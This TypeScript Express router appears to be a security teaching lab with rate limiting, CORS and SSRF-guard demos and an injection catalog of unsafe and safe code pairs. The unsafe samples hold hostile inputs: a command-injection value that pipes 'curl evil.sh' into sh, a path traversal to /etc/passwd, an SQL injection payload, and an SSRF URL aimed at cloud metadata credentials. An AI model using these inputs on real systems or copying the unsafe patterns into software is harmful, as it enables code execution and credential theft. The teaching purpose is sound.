import { Router, type Request, type Response } from 'express';
import { rateLimit } from 'express-rate-limit';
import { RateLimitException, ValidationException } from '../../core/error_handling/exceptions.js';
import { corsMiddleware, evaluateCorsOrigin } from '../middleware/cors_middleware.js';
import { createHandmadeRateLimiter } from '../middleware/handmade_rate_limiter.js';

/**
 * Security demo endpoints (the `security` topic's lab). Everything here is
 * REAL middleware behaving exactly as it would in production — the app's own
 * integration lesson, not a simulation:
 *
 * - helmet is mounted app-wide in app.ts (secure headers on EVERY response;
 *   GET /headers just echoes the headers the current response carries).
 * - GET /ping is guarded by express-rate-limit (the production library), tuned
 *   so the limit is trip-able live: 5 requests / 60s per client ip, then the
 *   canonical 429 envelope + Retry-After.
 * - GET /handmade-ping is guarded by the hand-rolled fixed-window twin
 *   (middleware/handmade_rate_limiter.ts — 3 requests / 30s) whose code the
 *   topic walks line by line.
 * - The CORS demo is the hand-rolled corsMiddleware factory
 *   (middleware/cors_middleware.ts) mounted on THIS router with an origin
 *   allowlist; /cors-check answers verdicts through the same decision
 *   function, and OPTIONS preflights are answered by the middleware itself.
 * - GET /ssrf-guard runs the REAL allowlist guard a fetcher should consult
 *   before ever dereferencing a user-supplied URL. It NEVER fetches.
 */

export const SECURITY_DEMO_MOUNT_PATH = '/api/demo/security';

// --- the express-rate-limit limiter (the production pick) -----------------------

export const SECURITY_PING_LIMIT = 5;
export const SECURITY_PING_WINDOW_MS = 60_000;

/** The request info express-rate-limit attaches under req.rateLimit. */
interface RateLimitRequestInfo {
  limit: number;
  used: number;
  remaining: number;
  resetTime: Date | undefined;
}

function rateLimitInfo(req: Request): RateLimitRequestInfo | undefined {
  return (req as Request & { rateLimit?: RateLimitRequestInfo }).rateLimit;
}

/**
 * A DEDICATED limiter for one demo route — never a global app.use() limit,
 * which would throttle the whole guide (and every test) after 5 requests.
 * windowMs 60s / limit 5 makes the 429 reachable by hand in the UI.
 *
 * The custom handler routes the trip through the app's ONE error taxonomy —
 * RateLimitException → rate_limited failure → the canonical envelope — instead
 * of the library's default text body, so clients see the same shape as every
 * other failure. The library sets its RateLimit-* / Retry-After headers BEFORE
 * calling the handler, so they survive into the envelope response.
 */
const securityPingLimiter = rateLimit({
  windowMs: SECURITY_PING_WINDOW_MS,
  limit: SECURITY_PING_LIMIT,
  standardHeaders: true, // RateLimit-Policy/Limit/Remaining/Reset (draft-6 style)
  legacyHeaders: false, // no library-emitted X-RateLimit-* — the handmade twin shows those
  handler: (req, _res, next) => {
    const info = rateLimitInfo(req);
    const retryAfterSeconds =
      info?.resetTime instanceof Date
        ? Math.max(0, Math.ceil((info.resetTime.getTime() - Date.now()) / 1000))
        : Math.ceil(SECURITY_PING_WINDOW_MS / 1000);
    next(
      new RateLimitException(
        `too many requests: the /ping demo allows ${String(SECURITY_PING_LIMIT)} per ${String(Math.ceil(SECURITY_PING_WINDOW_MS / 1000))}s per client ip — retry after ${String(retryAfterSeconds)}s`,
        {
          limiter: 'express-rate-limit (GET /api/demo/security/ping)',
          limit: SECURITY_PING_LIMIT,
          windowSeconds: Math.ceil(SECURITY_PING_WINDOW_MS / 1000),
          retryAfterSeconds,
          keyedBy: 'client ip',
        },
      ),
    );
  },
});

// --- the handmade fixed-window twin (the teaching pick) --------------------------

export const HANDMADE_PING_LIMIT = 3;
export const HANDMADE_PING_WINDOW_MS = 30_000;

const handmadePingLimiter = createHandmadeRateLimiter({
  windowMs: HANDMADE_PING_WINDOW_MS,
  max: HANDMADE_PING_LIMIT,
  name: 'GET /api/demo/security/handmade-ping',
});

/** Where the handmade limiter stashes its per-request facts (set pre-next). */
interface HandmadeInfo {
  limiter: string;
  count: number;
  limit: number;
  remaining: number;
  windowSeconds: number;
  resetAt: string;
}

/**
 * Test hook: wipe BOTH limiters so specs start from clean windows no matter
 * the suite's execution order. The express-rate-limit default key is req.ip —
 * supertest speaks IPv4-mapped IPv6, a real socket may not — reset every
 * loopback spelling.
 */
export function resetSecurityDemoLimiters(): void {
  handmadePingLimiter.reset();
  for (const key of ['127.0.0.1', '::ffff:127.0.0.1', '::1', 'unknown']) {
    securityPingLimiter.resetKey(key);
  }
}

// --- the CORS demo ---------------------------------------------------------------

/** The allowlist the demo middleware enforces (exact-match origins). */
export const SECURITY_CORS_ALLOWLIST: readonly string[] = [
  'http://localhost:5173', // the guide's own Vite dev origin
  'https://example.com', // a deliberate second allowed origin for the demo
];

const securityCors = corsMiddleware({
  origins: SECURITY_CORS_ALLOWLIST,
  methods: ['GET', 'POST', 'PATCH', 'DELETE', 'OPTIONS'],
  headers: ['Content-Type', 'Authorization', 'x-api-key'],
  credentials: true, // allowlisted + concrete-origin echo — the only safe pairing
  maxAgeSeconds: 600,
});

// --- the SSRF guard (allowlist-first, evasion-aware) ------------------------------

/**
 * Hosts the demo guard trusts. Deliberately tiny, exact-match, and INCLUDING
 * loopback (a dev-api guard legitimately calls itself) — a production
 * outbound-fetch allowlist would list external partners and NOTHING local.
 */
export const SSRF_ALLOWLIST: readonly string[] = [
  'httpbin.org',
  'www.httpbin.org',
  'example.com',
  'www.example.com',
  'localhost',
  '127.0.0.1',
  '::1',
];

export type SsrfVerdictKind =
  | 'allowed'
  | 'not_allowlisted'
  | 'private_or_loopback_ip'
  | 'ip_literal_evasion'
  | 'ipv6_literal'
  | 'punycode'
  | 'bad_scheme'
  | 'unparseable';

export interface SsrfVerdict {
  allowed: boolean;
  host: string;
  kind: SsrfVerdictKind;
  reason: string;
}

/** Private/loopback/link-local space as CIDR prefixes — [10]=10/8, [169,254]=169.254/16. */
const PRIVATE_RANGES: readonly { octets: readonly number[]; label: string }[] = [
  { octets: [10], label: 'private (10/8)' },
  { octets: [127], label: 'loopback (127/8)' },
  { octets: [169, 254], label: 'link-local (169.254/16) — the cloud metadata range' },
  { octets: [192, 168], label: 'private (192.168/16)' },
];

function classifyDottedQuad(literal: string): SsrfVerdict {
  const parts = literal.split('.');
  const octets = parts.map(Number);
  if (parts.length !== 4 || octets.some((octet) => !Number.isInteger(octet) || octet > 255)) {
    return {
      allowed: false,
      host: literal,
      kind: 'ip_literal_evasion',
      reason:
        'nonstandard dotted IP form (octal like 0177.0.0.1, shorthand like 127.1) — parsers disagree on these, guards must not',
    };
  }
  for (const { octets: prefix, label } of PRIVATE_RANGES) {
    const matches = prefix.every((octet, index) => octets[index] === octet);
    if (matches) {
      const isMetadata = literal === '169.254.169.254';
      return {
        allowed: false,
        host: literal,
        kind: 'private_or_loopback_ip',
        reason: isMetadata
          ? `${label} — 169.254.169.254 is the cloud instance-metadata address (the classic SSRF target)`
          : `${label} — internal addresses are never fetch targets`,
      };
    }
  }
  // 172.16.0.0–172.31.255.255 — the range that needs a number compare, not a prefix
  if (octets[0] === 172 && octets[1]! >= 16 && octets[1]! <= 31) {
    return {
      allowed: false,
      host: literal,
      kind: 'private_or_loopback_ip',
      reason: 'private (172.16/12) — internal addresses are never fetch targets',
    };
  }
  return {
    allowed: false,
    host: literal,
    kind: 'not_allowlisted',
    reason: `public IP literal ${literal} is not on the allowlist — default deny`,
  };
}

/**
 * Pull the host out of the RAW input string (lowercased, userinfo/port/
 * brackets/path stripped). Needed because WHATWG URL CANONICALIZES the
 * classic IPv4 disguises — new URL('http://0x7f000001/').hostname is already
 * "127.0.0.1" — so the disguise is only visible in the spelling the user sent.
 */
function extractRawHost(raw: string): string {
  const schemeIndex = raw.indexOf('://');
  let rest = schemeIndex >= 0 ? raw.slice(schemeIndex + 3) : raw;
  // userinfo precedes the host — http://safe.example@evil/ hosts EVIL, and the
  // host is what follows the LAST "@".
  const atParts = rest.split('@');
  rest = atParts[atParts.length - 1] ?? rest;
  rest = rest.split(/[/?#]/)[0] ?? '';
  // strip a trailing :port (the lazy match leaves IPv6 colons alone)
  const withPort = rest.match(/^(.+?)(?::\d+)$/);
  if (withPort !== null) rest = withPort[1]!;
  return rest.toLowerCase().replace(/^\[/, '').replace(/\]$/, '');
}

/**
 * The guard itself: validate a URL a user handed us BEFORE any fetch. Two
 * spellings are checked on purpose:
 *
 * 1. the PARSED host (lowercased, canonical) — the truth about where the
 *    request would go, and where private/link-local ranges are classified;
 * 2. the RAW spelling the user sent — because URL parsing canonicalizes
 *    0x7f000001 / 2130706433 / 0177.0.0.1 / 127.1 all down to 127.0.0.1, an
 *    obfuscated form could otherwise sneak THROUGH an allowlist entry.
 *    Policy: the allowlist matches CANONICAL spellings only — a disguise is
 *    denied as an evasion even when it canonicalizes to an allowed address.
 *
 * HONEST LIMITS (taught in the topic, stated here): this inspects hostname
 * STRINGS. A production guard also resolves DNS and re-checks the resolved IP
 * (a name can point anywhere — DNS rebinding), ideally pins it for the actual
 * socket connection, and forbids redirects. String-level checking stops every
 * classic URL trick; it cannot stop a name whose record changes.
 */
export function checkSsrfUrl(raw: string): SsrfVerdict {
  let parsed: URL;
  try {
    parsed = new URL(raw);
  } catch {
    return { allowed: false, host: '', kind: 'unparseable', reason: 'not a parseable absolute URL' };
  }

  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
    return {
      allowed: false,
      host: parsed.hostname,
      kind: 'bad_scheme',
      reason: `scheme ${parsed.protocol} is not http(s) — file:, gopher: etc. are never fetch targets`,
    };
  }

  const host = parsed.hostname.toLowerCase().replace(/^\[/, '').replace(/\]$/, '');
  const rawHost = extractRawHost(raw);

  // The one allow: exact allowlist match, in the CANONICAL spelling.
  if (SSRF_ALLOWLIST.includes(host) && rawHost === host) {
    return { allowed: true, host, kind: 'allowed', reason: 'host is on the exact-match allowlist (canonical spelling)' };
  }

  if (host.includes('xn--') || rawHost.includes('xn--')) {
    return {
      allowed: false,
      host,
      kind: 'punycode',
      reason: 'punycode (xn--) hostname — homograph attacks hide here; require the plain allowlisted spelling',
    };
  }
  if (/^0x[0-9a-f.]+$/.test(rawHost)) {
    return {
      allowed: false,
      host,
      kind: 'ip_literal_evasion',
      reason: `hex IP literal (0x7f000001 = 127.0.0.1) — the URL parser canonicalizes it to ${host}, but the allowlist matches canonical spellings only`,
    };
  }
  if (/^\d+$/.test(rawHost)) {
    return {
      allowed: false,
      host,
      kind: 'ip_literal_evasion',
      reason: `bare decimal IP (2130706433 = 127.0.0.1) — integer forms evade naive hostname checks; canonicalizes to ${host}`,
    };
  }
  if (rawHost !== host && /^(\d+\.)*\d+$/.test(rawHost)) {
    return {
      allowed: false,
      host,
      kind: 'ip_literal_evasion',
      reason: `obfuscated numeric host (${rawHost} canonicalizes to ${host}) — octal/shorthand forms parsers disagree on`,
    };
  }
  if (rawHost.includes(':') || host.includes(':')) {
    return {
      allowed: false,
      host,
      kind: 'ipv6_literal',
      reason:
        'IPv6 literal (incl. v4-mapped disguises like [::ffff:127.0.0.1]) — only the allowlisted canonical ::1 dev entry passes; everything else is default-deny',
    };
  }
  if (/^(\d{1,3}\.){3}\d{1,3}$/.test(host)) {
    return classifyDottedQuad(host);
  }

  return {
    allowed: false,
    host,
    kind: 'not_allowlisted',
    reason: 'host is not on the allowlist — default deny',
  };
}

// --- the injection catalog (safe vs unsafe pairs, served as data) -----------------

export interface InjectionSample {
  family: 'sql' | 'command' | 'xss' | 'path' | 'ssrf';
  title: string;
  language: string;
  why: string;
  unsafeCode: string;
  safeCode: string;
}

export interface EnforcedControl {
  control: string;
  status: 'enforced' | 'not_applicable' | 'planned';
  detail: string;
}

const INJECTION_SAMPLES: readonly InjectionSample[] = [
  {
    family: 'sql',
    title: 'SQL injection',
    language: 'ts',
    why: 'string-built SQL makes user data part of the CODE; parameter binding keeps it DATA',
    unsafeCode: `// ❌ user input concatenated into the query TEXT
const query = \`SELECT * FROM posts WHERE author = '\${author}'\`;
// author = "x' OR '1'='1" → every row falls out
db.prepare(query).all();`,
    safeCode: `// ✅ the app's own PostDao (data/posts/post_dao.ts) — bound parameters
db.prepare('SELECT … FROM posts WHERE id = ?').get(id);
db.prepare('INSERT INTO posts (…) VALUES (@id, @title, …)').run(row);`,
  },
  {
    family: 'command',
    title: 'Command injection',
    language: 'ts',
    why: 'a shell string lets ; | && $() become CODE; execFile passes argv, no shell',
    unsafeCode: `// ❌ a shell interprets metacharacters
import { exec } from 'node:child_process';
exec(\`convert \${String(userFile)} out.png\`);
// userFile = "a.png; curl evil.sh | sh"`,
    safeCode: `// ✅ execFile — argv array, no shell, and validate the filename first
import { execFile } from 'node:child_process';
execFile('convert', [validatedFile, 'out.png'], callback);`,
  },
  {
    family: 'xss',
    title: 'Cross-site scripting',
    language: 'tsx',
    why: 'React escapes text nodes by default; dangerouslySetInnerHTML opts OUT of that',
    unsafeCode: `// ❌ raw HTML from anywhere into the DOM
<div dangerouslySetInnerHTML={{ __html: String(post.body) }} />`,
    safeCode: `// ✅ the guide's code_block renders code as TEXT — children, not innerHTML
// <pre data-testid="code-block">{code}</pre> — escaped by React itself`,
  },
  {
    family: 'path',
    title: 'Path traversal',
    language: 'ts',
    why: "the '../' sequence escapes the intended root; resolve and assert the result stays inside it",
    unsafeCode: `// ❌ join alone does not stop traversal
const file = path.join('/uploads', String(req.params.name));
// name = "../../etc/passwd" → join happily walks out`,
    safeCode: `// ✅ resolve, then assert containment
const root = path.resolve('/uploads');
const file = path.resolve(root, String(req.params.name));
if (!file.startsWith(root + path.sep)) throw new ValidationException('nope');`,
  },
  {
    family: 'ssrf',
    title: 'Server-side request forgery',
    language: 'ts',
    why: "the server's network position is the asset; allowlist before ANY fetch",
    unsafeCode: `// ❌ the server fetches wherever it is told
await fetch(String(req.query.url));
// ?url=http://169.254.169.254/latest/meta-data/ → cloud credentials`,
    safeCode: `// ✅ this app's guard (checkSsrfUrl) — verdict BEFORE any fetch
const verdict = checkSsrfUrl(String(req.query.url));
if (!verdict.allowed) throw new ValidationException(verdict.reason);`,
  },
];

const ENFORCED_CONTROLS: readonly EnforcedControl[] = [
  {
    control: 'parameterized SQL everywhere',
    status: 'enforced',
    detail: 'every statement in data/posts/post_dao.ts binds ? / @named parameters — no string-built SQL exists in the tree',
  },
  {
    control: 'constant-time credential compares',
    status: 'enforced',
    detail: 'the auth topic hashes BOTH sides then timingSafeEqual (auth demo users + webhook HMACs) — no early-exit string compares',
  },
  {
    control: 'HMAC over raw request bytes',
    status: 'enforced',
    detail: 'webhook signatures verify over the captured rawBody buffer, not re-serialized JSON (webhooks_demo_routes.ts)',
  },
  {
    control: 'redirect targets validated before 302',
    status: 'enforced',
    detail: 'the OAuth demo checks redirect_uri against an exact allowlist before any redirect (oauth_demo_routes.ts)',
  },
  {
    control: 'client renders untrusted content as text',
    status: 'enforced',
    detail: 'the guide client has zero dangerouslySetInnerHTML; code samples render as React children',
  },
  {
    control: 'no shell-outs with user input',
    status: 'not_applicable',
    detail: 'no route spawns processes today; when one does, the rule is execFile with an argv array — never exec with a string',
  },
  {
    control: 'path traversal containment',
    status: 'planned',
    detail: 'demonstrated for real in the Files & Media topic (uploads/Downloads) — not yet landed',
  },
];

// --- controllers -------------------------------------------------------------------

function pingController(req: Request, res: Response): void {
  const info = rateLimitInfo(req);
  res.json({
    ok: true,
    limiter: 'express-rate-limit (the production pick)',
    limit: info?.limit ?? SECURITY_PING_LIMIT,
    used: info?.used,
    remaining: info?.remaining,
    resetAt: info?.resetTime instanceof Date ? info.resetTime.toISOString() : undefined,
    keyedBy: 'client ip',
    note: `${String(SECURITY_PING_LIMIT)} requests / ${String(Math.ceil(SECURITY_PING_WINDOW_MS / 1000))}s per ip — the 6th inside the window gets the 429 envelope + Retry-After`,
  });
}

function handmadePingController(_req: Request, res: Response): void {
  const info = res.locals.handmadeRateLimit as HandmadeInfo | undefined;
  res.json({
    ok: true,
    limiter: 'handmade fixed window (middleware/handmade_rate_limiter.ts)',
    count: info?.count,
    limit: info?.limit ?? HANDMADE_PING_LIMIT,
    remaining: info?.remaining,
    windowSeconds: info?.windowSeconds,
    resetAt: info?.resetAt,
    note: `${String(HANDMADE_PING_LIMIT)} requests / ${String(Math.ceil(HANDMADE_PING_WINDOW_MS / 1000))}s — the algorithm the topic walks, behaving like its production twin`,
  });
}

function headersController(req: Request, res: Response): void {
  // res.getHeaders() is the FULL outgoing header set at handler time — which
  // already includes helmet's (mounted app-wide in app.ts) plus the
  // request-id middleware's x-request-id. This endpoint only REPORTS them.
  const raw = res.getHeaders();
  const headers: Record<string, string> = {};
  for (const [name, value] of Object.entries(raw)) {
    headers[name] = Array.isArray(value) ? value.join(', ') : String(value);
  }
  res.json({
    requestPath: req.originalUrl.split('?')[0],
    headerCount: Object.keys(headers).length,
    headers,
    note: 'every header THIS response carries — helmet set the security ones before any route ran; the client maps them to explainers',
  });
}

function corsCheckController(req: Request, res: Response): void {
  const raw = req.query.origin;
  if (typeof raw !== 'string' || raw === '') {
    throw new ValidationException('"origin" query parameter is required (e.g. ?origin=https://example.com)', {
      parameter: 'origin',
    });
  }
  if (raw.length > 512) {
    throw new ValidationException('"origin" must be at most 512 characters', { parameter: 'origin' });
  }
  // Shape check: an origin is scheme://host[:port] — no path, query, or hash.
  let parsed: URL;
  try {
    parsed = new URL(raw);
  } catch {
    throw new ValidationException('"origin" is not a parseable URL', { parameter: 'origin', received: raw });
  }
  if ((parsed.protocol !== 'http:' && parsed.protocol !== 'https:') || parsed.origin !== raw) {
    throw new ValidationException(
      '"origin" must be bare scheme://host[:port] — drop any path, query, or trailing slash',
      { parameter: 'origin', received: raw },
    );
  }

  // The SAME decision function the mounted middleware uses — the check cannot
  // disagree with the enforcement, by construction.
  const verdict = evaluateCorsOrigin({ origins: SECURITY_CORS_ALLOWLIST, credentials: true }, raw);
  res.json({
    origin: raw,
    allowed: verdict.allowed,
    accessControlAllowOrigin: verdict.allowOrigin,
    credentials: verdict.credentials,
    allowlist: SECURITY_CORS_ALLOWLIST,
    enforcedBy: 'the browser, not the server — a disallowed origin still gets its request RUN; the page just never sees the response',
    note: verdict.allowed
      ? 'on the allowlist — a browser page from this origin may read cross-origin responses from this API'
      : 'not on the allowlist — this middleware adds no Access-Control-* headers, so the BROWSER blocks the calling page from reading the response',
  });
}

function corsProbeController(_req: Request, res: Response): void {
  res.json({
    ok: true,
    note: 'any CORS headers on THIS response came from the mounted corsMiddleware — fire it with an Origin header (or as an OPTIONS preflight) and inspect',
  });
}

function injectionSamplesController(_req: Request, res: Response): void {
  res.json({
    samples: INJECTION_SAMPLES,
    enforced: ENFORCED_CONTROLS,
    note: 'safe/unsafe pairs as data — the client renders them; the enforced list is this repo\'s own honest status',
  });
}

function ssrfGuardController(req: Request, res: Response): void {
  const raw = req.query.url;
  if (typeof raw !== 'string' || raw === '') {
    throw new ValidationException(
      '"url" query parameter is required (e.g. ?url=http://example.com/get)',
      { parameter: 'url' },
    );
  }
  if (raw.length > 2048) {
    throw new ValidationException('"url" must be at most 2048 characters', { parameter: 'url' });
  }

  const verdict = checkSsrfUrl(raw);
  res.json({
    url: raw,
    allowed: verdict.allowed,
    host: verdict.host,
    kind: verdict.kind,
    reason: verdict.reason,
    allowlist: SSRF_ALLOWLIST,
    fetched: false,
    note: 'this endpoint NEVER fetches — it is the guard a real outbound fetcher must consult first. String-level checking stops the URL tricks; a production guard also resolves DNS and re-checks the IP (rebinding).',
  });
}

export const securityDemoRouter = Router();
// CORS first, so preflights for every route below are answered by the factory.
securityDemoRouter.use(securityCors);
securityDemoRouter.get('/demo/security/headers', headersController);
securityDemoRouter.get('/demo/security/ping', securityPingLimiter, pingController);
securityDemoRouter.get('/demo/security/handmade-ping', handmadePingLimiter, handmadePingController);
securityDemoRouter.get('/demo/security/cors-check', corsCheckController);
securityDemoRouter.get('/demo/security/cors-probe', corsProbeController);
securityDemoRouter.get('/demo/security/injection-samples', injectionSamplesController);
securityDemoRouter.get('/demo/security/ssrf-guard', ssrfGuardController);
